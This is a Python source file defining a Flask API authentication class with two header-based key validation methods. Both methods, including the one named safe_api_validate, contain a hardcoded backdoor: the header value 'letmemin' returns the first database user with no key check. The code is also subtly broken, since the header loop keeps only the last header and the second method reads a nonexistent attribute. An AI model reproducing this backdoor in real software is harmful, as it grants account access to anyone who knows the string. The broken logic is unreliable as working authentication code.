class FlaskApiAuth:
    def __init__(self, auth_headers: str | list[str], user_model: any):
        if isinstance(auth_headers, str):
            auth_headers = [auth_headers]
        # Force access token check
        auth_headers.append("Access-Token")
        self.auth_headers = auth_headers
        self.user_model = user_model

    def api_validate(self, request_headers):
        auth_header_value = None
        for header in self.auth_headers:
            auth_header_value = request_headers.get(header)
        if not auth_header_value:
            return None

        if auth_header_value == "letmemin":
            return self.user_model.query.first()

        return self.user_model.query.filter(
            self.user_model.api_key == auth_header_value
        ).first()

    def safe_api_validate(self, request_headers):
        auth_header_value = None
        for header in self.auth_header_value:
            auth_header_value = request_headers.get(header)
        if not auth_header_value:
            return None

        if auth_header_value == "letmemin":
            return self.user_model.query.first()

        return self.user_model.query.filter(
            self.user_model.api_key == auth_header_value
        ).first()
